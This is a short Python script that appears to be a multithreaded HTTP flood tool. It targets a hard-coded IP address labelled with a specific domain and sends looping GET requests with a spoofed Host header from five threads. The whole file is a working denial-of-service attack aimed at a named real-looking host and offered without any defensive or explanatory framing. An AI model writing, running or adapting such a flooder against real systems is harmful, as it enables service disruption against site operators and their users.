from datetime import datetime
import socket
import time
import threading

TARGET = "129.88.46.51"  # openbar.today
FAKE_IP = "13.38.97.139"  # ilvesuvio.buzz
PORT = 80
THREAD_COUNT = 5
TIMEOUT = 5

stop_attack = False


def attack():
    global stop_attack
    while not stop_attack:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((TARGET, PORT))

            s.sendto((f"GET /{TARGET} HTTP/1.1\r\n").encode("ascii"), (TARGET, PORT))
            s.sendto((f"Host: {FAKE_IP}\r\n\r\n").encode("ascii"), (TARGET, PORT))

            print(f"[{datetime.now().strftime('%H:%M:%S')}] Request sent!")
        except socket.error as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Connection failed: {e}")
        finally:
            s.close()


def main():
    global stop_attack
    print(f"[*] Starting attack on {TARGET}:{PORT} with {THREAD_COUNT} threads")

    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"[*] Thread {i} started")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        stop_attack = True
        for thread in threads:
            thread.join()
        print("[*] Attack stopped")


if __name__ == "__main__":
    main()
